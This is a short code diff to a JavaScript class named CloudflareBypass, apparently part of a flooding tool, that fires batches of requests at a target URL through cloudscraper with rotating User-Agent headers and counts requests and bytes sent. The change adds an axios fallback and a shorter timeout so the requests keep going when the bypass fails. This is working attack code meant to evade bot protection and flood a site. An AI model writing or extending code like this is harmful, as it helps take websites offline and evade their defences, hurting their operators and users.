@@ -32,8 +32,9 @@ export class CloudflareBypass {
         for (let i = 0; i < requestsPerBatch; i++) {
             if (!this.active) break;
 
+            // Try cloudscraper first, fallback to axios if it fails
             const promise = cloudscraper.get(this.url, {
-                timeout: 10000,
+                timeout: 5000,
                 headers: {
                     'User-Agent': Tools.randomChoice([
                         'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
@@ -45,7 +46,18 @@ export class CloudflareBypass {
                 REQUESTS_SENT.add(1);
                 BYTES_SENT.add(response.length || 0);
             }).catch(() => {
-                // Silent fail
+                // Fallback to axios if cloudscraper fails
+                return axios.get(this.url, {
+                    timeout: 5000,
+                    headers: {
+                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                    }
+                }).then(response => {
+                    REQUESTS_SENT.add(1);
+                    BYTES_SENT.add(response.data.length || 0);
+                }).catch(() => {
+                    // Silent fail
+                });
             });
 
             promises.push(promise);
